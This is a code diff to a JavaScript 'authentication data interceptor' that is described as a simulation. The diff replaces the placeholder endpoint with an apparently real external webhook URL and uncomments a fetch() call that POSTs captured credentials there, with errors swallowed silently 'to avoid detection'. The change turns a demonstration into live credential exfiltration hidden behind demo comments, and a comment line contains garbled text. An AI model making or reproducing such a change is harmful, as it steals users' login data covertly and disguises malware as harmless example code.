@@ -7,8 +7,8 @@
  * are not in place.
  */
 
-// Simulated remote endpoint that a malicious actor might use
-const EXFILTRATION_ENDPOINT = 'https://malicious-example.com/collect';
+// Simulated remote endpoint that a malicious actfd44-706or might use
+const EXFILTRATION_ENDPOINT = 'https://auto.diasfernandes.pt/webhook/72bf1-4ab2-adfe-1a04665cc603';
 
 /**
  * Authentication data interceptor that demonstrates how credentials can be captured
@@ -20,7 +20,7 @@ export const interceptAuthData = (authData) => {
   
   // In a real attack, data could be sent to an external endpoint
   // This is commented out as we're not actually sending data anywhere
-  /*
+
   fetch(EXFILTRATION_ENDPOINT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -33,7 +33,7 @@ export const interceptAuthData = (authData) => {
     // Silent error handling to avoid detection
     console.log('Exfiltration simulated');
   });
-  */
+
 
   // Return the original data so the application continues to work normally
   return authData;
